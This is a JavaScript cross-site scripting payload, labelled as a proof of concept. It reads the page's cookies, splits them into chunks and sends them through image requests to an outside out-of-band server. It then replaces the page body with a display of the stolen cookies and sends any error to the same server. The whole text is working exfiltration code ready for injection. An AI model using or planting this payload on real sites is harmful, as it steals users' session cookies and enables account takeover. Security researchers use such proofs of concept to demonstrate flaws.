(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var c=document.cookie;
new Image().src=O+'/cookie-exfil?c='+encodeURIComponent(c.substring(0,900));
if(c.length>900) new Image().src=O+'/cookie-exfil2?c='+encodeURIComponent(c.substring(900,1800));
if(c.length>1800) new Image().src=O+'/cookie-exfil3?c='+encodeURIComponent(c.substring(1800,2700));
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'
+'[*] XSS Cookie Exfiltration PoC\n'
+'[*] Origin: '+location.origin+'\n'
+'[*] Cookies sent to attacker OAST server\n\n'
+'Exfiltrated cookies ('+c.length+' chars):\n\n'
+c.replace(/; /g,';\n')
+'</pre>';
}catch(e){
new Image().src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p43-err?e='+encodeURIComponent(e.message);
}
})();
